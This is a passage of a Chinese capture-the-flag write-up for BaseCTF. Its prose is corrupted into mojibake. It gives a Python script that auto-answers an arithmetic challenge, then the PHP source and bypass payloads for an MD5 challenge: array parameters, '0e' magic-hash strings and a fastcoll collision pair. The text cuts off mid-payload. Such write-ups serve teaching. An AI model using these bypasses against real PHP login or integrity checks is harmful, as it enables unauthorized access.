title="æ•°å­¦å¤§å¸ˆ"></a>æ•°å­¦å¤§å¸ˆ</h4><p>è„šæœ¬é¢˜ï¼Œæ³¨æ„é™¤æ³•å–æ•´è€Œä¸”è¦æ›¿æ¢ä¸€ä¸‹ä¹˜å·å’Œé™¤å·</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">from</span> bs4 <span class="token keyword">import</span> BeautifulSoup<span class="token keyword">import</span> re<span class="token keyword">import</span> ast<span class="token keyword">def</span> <span class="token function">safe_eval</span><span class="token punctuation">(</span>expression<span class="token punctuation">)</span><span class="token punctuation">:</span>    node <span class="token operator">=</span> ast<span class="token punctuation">.</span>parse<span class="token punctuation">(</span>expression<span class="token punctuation">,</span> mode<span class="token operator">=</span><span class="token string">'eval'</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token builtin">eval</span><span class="token punctuation">(</span><span class="token builtin">compile</span><span class="token punctuation">(</span>node<span class="token punctuation">,</span> <span class="token string">'&lt;string>'</span><span class="token punctuation">,</span> <span class="token string">'eval'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token string">"__builtins__"</span><span class="token punctuation">:</span> <span class="token boolean">None</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>url <span class="token operator">=</span> <span class="token string">"http://challenge.basectf.fun:27436/"</span>headers <span class="token operator">=</span> <span class="token punctuation">&#123;</span>    <span class="token string">"Content-Type"</span><span class="token punctuation">:</span> <span class="token string">"application/x-www-form-urlencoded"</span><span class="token punctuation">,</span>    <span class="token string">"Accept"</span><span class="token punctuation">:</span> <span class="token string">"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7"</span><span class="token punctuation">,</span>    <span class="token string">"user-agent"</span><span class="token punctuation">:</span> <span class="token string">"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36 Edg/128.0.0.0"</span><span class="token punctuation">&#125;</span>session <span class="token operator">=</span> requests<span class="token punctuation">.</span>session<span class="token punctuation">(</span><span class="token punctuation">)</span>response <span class="token operator">=</span> session<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token keyword">for</span> _ <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">50</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    soup <span class="token operator">=</span> BeautifulSoup<span class="token punctuation">(</span>response<span class="token punctuation">.</span>text<span class="token punctuation">,</span> <span class="token string">"lxml"</span><span class="token punctuation">)</span>    key_text <span class="token operator">=</span> soup<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">'body'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>text    <span class="token keyword">match</span> <span class="token operator">=</span> re<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">r'\d+[+\-Ã—Ã·]\d+'</span><span class="token punctuation">,</span> key_text<span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token keyword">match</span><span class="token punctuation">:</span>        calculation <span class="token operator">=</span> <span class="token keyword">match</span><span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>calculation<span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token string">'Ã·'</span> <span class="token keyword">in</span> calculation<span class="token punctuation">:</span>            calculation <span class="token operator">=</span> calculation<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'Ã·'</span><span class="token punctuation">,</span> <span class="token string">'//'</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token string">'Ã—'</span> <span class="token keyword">in</span> calculation<span class="token punctuation">:</span>            calculation <span class="token operator">=</span> calculation<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'Ã—'</span><span class="token punctuation">,</span> <span class="token string">'*'</span><span class="token punctuation">)</span>        result <span class="token operator">=</span> safe_eval<span class="token punctuation">(</span>calculation<span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>calculation<span class="token punctuation">&#125;</span></span><span class="token string">=</span><span class="token interpolation"><span class="token punctuation">&#123;</span>result<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>        post_data <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">"answer"</span><span class="token punctuation">:</span> <span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>result<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">&#125;</span>        response <span class="token operator">=</span> session<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>post_data<span class="token punctuation">,</span> headers<span class="token operator">=</span>headers<span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>response<span class="token punctuation">.</span>text<span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token string">'CTF'</span> <span class="token keyword">in</span> response<span class="token punctuation">.</span>text<span class="token punctuation">:</span>            <span class="token keyword">match</span> <span class="token operator">=</span> re<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">r'BaseCTF(.*)'</span><span class="token punctuation">,</span> response<span class="token punctuation">.</span>text<span class="token punctuation">)</span>            <span class="token keyword">if</span> <span class="token keyword">match</span><span class="token punctuation">:</span>                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token keyword">match</span><span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token format-spec">-6]</span><span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>                exit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span></code></pre><h4 id="æ‰€ä»¥ä½ è¯´ä½ æ‡‚-MD5-å“ˆå¸Œé•¿åº¦æ‹“å±•æ”»å‡»"><a href="#æ‰€ä»¥ä½ è¯´ä½ æ‡‚-MD5-å“ˆå¸Œé•¿åº¦æ‹“å±•æ”»å‡»" class="headerlink" title="æ‰€ä»¥ä½ è¯´ä½ æ‡‚ MD5?  (å“ˆå¸Œé•¿åº¦æ‹“å±•æ”»å‡»)"></a>æ‰€ä»¥ä½ è¯´ä½ æ‡‚ MD5?  (å“ˆå¸Œé•¿åº¦æ‹“å±•æ”»å‡»)</h4><pre class="language-php" data-language="php"><code class="language-php"> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// æ‰€ä»¥ä½ è¯´ä½ æ‡‚ MD5 äº†?</span><span class="token variable">$apple</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'apple'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$banana</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'banana'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span><span class="token variable">$apple</span> <span class="token operator">!==</span> <span class="token variable">$banana</span> <span class="token operator">&amp;&amp;</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$apple</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$banana</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'åŠ å¼ºéš¾åº¦å°±ä¸ä¼šäº†?'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">// ä»€ä¹ˆ? ä½ ç»•è¿‡å»äº†?</span><span class="token comment">// åŠ å¤§å‰‚é‡!</span><span class="token comment">// æˆ‘è¦è®©ä»–æˆä¸º string</span><span class="token variable">$apple</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword type-casting">string</span><span class="token punctuation">)</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'appple'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$banana</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword type-casting">string</span><span class="token punctuation">)</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'bananana'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword type-casting">string</span><span class="token punctuation">)</span><span class="token variable">$apple</span> <span class="token operator">!==</span> <span class="token punctuation">(</span><span class="token keyword type-casting">string</span><span class="token punctuation">)</span><span class="token variable">$banana</span> <span class="token operator">&amp;&amp;</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword type-casting">string</span><span class="token punctuation">)</span><span class="token variable">$apple</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword type-casting">string</span><span class="token punctuation">)</span><span class="token variable">$banana</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'éš¾å—?ä¸éš¾!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">// ä½ è¿˜æ˜¯ç»•è¿‡å»äº†?</span><span class="token comment">// å“¦å“¦å“¦, æˆ‘å°‘äº†ä¸€ä¸ªç­‰äºå·</span><span class="token variable">$apple</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword type-casting">string</span><span class="token punctuation">)</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'apppple'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$banana</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword type-casting">string</span><span class="token punctuation">)</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'banananana'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword type-casting">string</span><span class="token punctuation">)</span><span class="token variable">$apple</span> <span class="token operator">!==</span> <span class="token punctuation">(</span><span class="token keyword type-casting">string</span><span class="token punctuation">)</span><span class="token variable">$banana</span> <span class="token operator">&amp;&amp;</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword type-casting">string</span><span class="token punctuation">)</span><span class="token variable">$apple</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword type-casting">string</span><span class="token punctuation">)</span><span class="token variable">$banana</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'å˜»å˜», ä¸ä¼šäº†? æ²¡çœ‹ç›´æ’­å›æ”¾?'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">// ä½ ä»¥ä¸ºè¿™å°±ç»“æŸäº†</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'random'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'random'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">bin2hex</span><span class="token punctuation">(</span><span class="token function">random_bytes</span><span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token function">bin2hex</span><span class="token punctuation">(</span><span class="token function">random_bytes</span><span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token function">bin2hex</span><span class="token punctuation">(</span><span class="token function">random_bytes</span><span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">// ä½ æƒ³çœ‹åˆ° random çš„å€¼å—?</span><span class="token comment">// ä½ ä¸æ˜¯å¾ˆæ‡‚ MD5 å—? é‚£æˆ‘å°±å‘Šè¯‰ä½ ä»–çš„ MD5 å§</span><span class="token variable">$random</span> <span class="token operator">=</span> <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'random'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$random</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;br />'</span><span class="token punctuation">;</span><span class="token variable">$name</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span> <span class="token operator">??</span> <span class="token string single-quoted-string">'user'</span><span class="token punctuation">;</span><span class="token comment">// check if name ends with 'admin'</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">5</span><span class="token punctuation">)</span> <span class="token operator">!==</span> <span class="token string single-quoted-string">'admin'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'ä¸æ˜¯ç®¡ç†å‘˜ä¹Ÿæ¥å‡‘çƒ­é—¹?'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$md5</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'md5'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$random</span> <span class="token operator">.</span> <span class="token variable">$name</span><span class="token punctuation">)</span> <span class="token operator">!==</span> <span class="token variable">$md5</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'ä¼ªé€ ? NO NO NO!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">// è®¤è¾“äº†, çœ‹æ ·å­ä½ çœŸçš„å¾ˆæ‡‚ MD5</span><span class="token comment">// é‚£ flag å°±ç»™ä½ å§</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"çœ‹æ ·å­ä½ çœŸçš„å¾ˆæ‡‚ MD5"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/flag'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> åŠ å¼ºéš¾åº¦å°±ä¸ä¼šäº†<span class="token operator">?</span></span></code></pre><p>ç¬¬ä¸€å±‚å¯ç”¨æ•°ç»„ç»•è¿‡</p><pre class="language-php" data-language="php"><code class="language-php">apple<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">1</span><span class="token operator">&amp;</span>banana<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">2</span></code></pre><p>ç¬¬äºŒå±‚è½¬åŒ–ä¸ºäº†<code>string</code>ï¼Œæ­¤æ—¶æ•°ç»„ä¼šå˜æˆ<code>array</code>æ— æ³•ç»•è¿‡ï¼Œå¯ä»¥åˆ©ç”¨åé¢çš„å¼±æ¯”è¾ƒï¼Œè®©0eå¼€å¤´çš„å­—ç¬¦ä¸²è¯¯ä»¥ä¸ºç§‘å­¦è®¡æ•°æ³•ï¼Œè½¬åŒ–ä¸º0</p><pre class="language-php" data-language="php"><code class="language-php">appple<span class="token operator">=</span><span class="token constant">QNKCDZO</span><span class="token operator">&amp;</span>banananana<span class="token operator">=</span><span class="token constant">QLTHNDT</span> </code></pre><p>ç¬¬ä¸‰å±‚å˜æˆäº†å¼ºæ¯”è¾ƒï¼Œå¯ä»¥ä½¿ç”¨fastcollå·¥å…·æ¥å¾—åˆ°ä¸€äº›MD5çœŸå®ç›¸ç­‰çš„å€¼</p><p>å…ˆéšä¾¿åˆ›å»ºä¸€ä¸ªtxtæ–‡ä»¶ï¼Œç„¶åå°†æ–‡ä»¶æ‹–å…¥<code>fastcoll</code>ä¸­å¾—åˆ°ä¸¤ä¸ªMD5å€¼ç›¸ç­‰çš„æ–‡ä»¶ï¼Œç„¶åä½¿ç”¨phpå¾—å‡ºMD5å€¼ç›¸ç­‰çš„ä¿©å­—ç¬¦ä¸²</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">function</span> <span class="token function-definition function">readmyfile</span><span class="token punctuation">(</span><span class="token variable">$path</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span> <span class="token variable">$fh</span> <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span><span class="token variable">$path</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"rb"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token function">fread</span><span class="token punctuation">(</span><span class="token variable">$fh</span><span class="token punctuation">,</span> <span class="token function">filesize</span><span class="token punctuation">(</span><span class="token variable">$path</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token function">fclose</span><span class="token punctuation">(</span><span class="token variable">$fh</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">return</span> <span class="token variable">$data</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">readmyfile</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"D:\CTF\Tool\\fastcoll_v1.0.0.5.exe\drafr_msg1.txt"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$b</span> <span class="token operator">=</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">readmyfile</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"D:\CTF\Tool\\fastcoll_v1.0.0.5.exe\drafr_msg2.txt"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword type-casting">string</span><span class="token punctuation">)</span><span class="token function">urldecode</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">===</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword type-casting">string</span><span class="token punctuation">)</span><span class="token function">urldecode</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">echo</span> <span class="token variable">$a</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">urldecode</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token operator">!=</span><span class="token function">urldecode</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">echo</span> <span class="token variable">$b</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span></code></pre><pre class="language-php" data-language="php"><code class="language-php">apppple<span class="token operator">=</span>hsad<span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token constant">C0</span><span class="token operator">%</span><span class="token constant">E9</span><span class="token operator">%</span><span class="token constant">CC</span><span class="token operator">%</span><span class="token constant">C5</span><span class="token operator">%</span><span class="token number">03</span><span class="token operator">%</span><span class="token number">0</span>E<span class="token operator">%</span><span class="token number">0</span>E<span class="token operator">%</span><span class="token constant">D4</span><span class="token operator">%</span><span class="token number">5</span>D<span class="token operator">%</span><span class="token constant">BB</span><span class="token operator">%</span><span class="token number">27</span><span class="token operator">%</span><span class="token number">2</span>A<span class="token operator">%</span><span class="token constant">B1</span><span class="token operator">%</span><span class="token constant">E4</span><span class="token operator">%</span><span class="token constant">AB</span><span class="token operator">%</span><span class="token constant">C0</span><span class="token operator">%</span><span class="token number">23</span>Vg<span class="token operator">%</span><span class="token number">22</span>u<span class="token operator">%</span><span class="token number">05</span><span class="token operator">%</span><span class="token number">95</span>Z<span class="token operator">%</span><span class="token number">1</span>B<span class="token operator">%</span><span class="token constant">CA</span><span class="token operator">%</span><span class="token number">80</span><span class="token operator">%</span><span class="token number">8</span>DS<span class="token operator">%</span><span class="token number">0</span>A<span class="token operator">%</span><span class="token number">92</span><span class="token operator">%</span><span class="token constant">EC</span><span class="token operator">%</span><span class="token constant">BC</span><span class="token operator">%</span><span class="token constant">A3</span><span class="token operator">%</span><span class="token number">08</span><span class="token operator">%</span><span class="token constant">F2</span><span class="token operator">%</span><span class="token number">3</span>E<span class="token operator">%</span>EDf<span class="token operator">%</span><span class="token constant">FA</span><span class="token operator">%</span><span class="token constant">EB</span><span class="token operator">-</span>ha<span class="token operator">%</span><span class="token number">88</span><span class="token operator">%</span><span class="token constant">D3</span><span class="token operator">%</span><span class="token number">98</span><span class="token operator">%</span><span class="token number">7</span>D<span class="token operator">%</span><span class="token number">95</span>E<span class="token operator">%</span><span class="token constant">F6</span><span class="token operator">%</span><span class="token constant">A1</span><span class="token operator">%</span><span class="token number">1</span>B<span class="token operator">%</span><span class="token number">5</span>B<span class="token operator">%</span><span class="token number">7</span>D<span class="token operator">%</span><span class="token number">21</span>y<span class="token operator">%</span><span class="token constant">A5</span><span class="token operator">%</span><span class="token number">12</span>f<span class="token operator">%</span><span class="token constant">B5H</span><span class="token operator">%</span><span class="token constant">F9</span><span class="token operator">%</span><span class="token number">3</span>C<span class="token operator">%</span><span class="token number">2</span>A<span class="token operator">%</span>F7Lci<span class="token operator">%</span><span class="token number">8</span>Dg<span class="token operator">%</span><span class="token constant">FC</span><span class="token operator">%</span><span class="token number">7</span>B8y<span class="token operator">%</span><span class="token constant">CD</span><span class="token operator">%</span><span class="token constant">A3</span><span class="token operator">%</span><span class="token number">8</span>E<span class="token operator">%</span><span class="token constant">E4</span><span class="token operator">%</span><span class="token constant">E7</span><span class="token operator">%</span><span class="token constant">D5</span><span class="token operator">%</span><span class="token number">0</span>F<span class="token operator">%</span><span class="token number">5</span>EI<span class="token operator">%</span><span class="token number">13</span><span class="token operator">%</span>C8n<span class="token operator">%</span><span class="token number">8</span>A<span class="token operator">%</span><span class="token number">86</span><span class="token operator">%</span><span class="token constant">F9</span><span class="token operator">%</span><span class="token number">9</span>FK_a<span class="token operator">%</span><span class="token number">27</span><span class="token operator">%</span>C1h<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token constant">B5</span><span class="token operator">%</span><span class="token number">0</span>Atg<span class="token operator">%</span><span class="token number">93</span><span class="token operator">%</span><span class="token number">5</span>E<span class="token operator">%</span><span class="token number">96</span><span class="token operator">%</span><span class="token number">95</span>g<span class="token operator">%</span><span class="token constant">F9T</span><span class="token operator">%</span><span class="token number">27</span><span class="token operator">%</span><span class="token number">03</span>K<span class="token operator">%</span><span class="token number">04</span><span class="token operator">%</span><span class="token number">8</span>F<span class="token operator">%</span><span class="token number">0</span>D<span class="token operator">%</span><span class="token constant">CA</span><span class="token operator">%</span><span class="token constant">C8</span><span class="token operator">%</span><span class="token constant">A8W</span><span class="token operator">%</span><span class="token number">1</span>E<span class="token operator">%</span><span class="token number">3</span>C<span class="token operator">%</span><span class="token number">84</span><span class="token operator">%</span><span class="token number">9</span>F<span class="token operator">%</span><span class="token constant">D6</span><span class="token operator">%</span><span class="token constant">AB</span><span class="token operator">%</span><span class="token number">3</span>D<span class="token operator">%</span><span class="token constant">BCT</span><span class="token operator">&amp;</span>banananana<span class="token operator">=</span>hsad<span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span 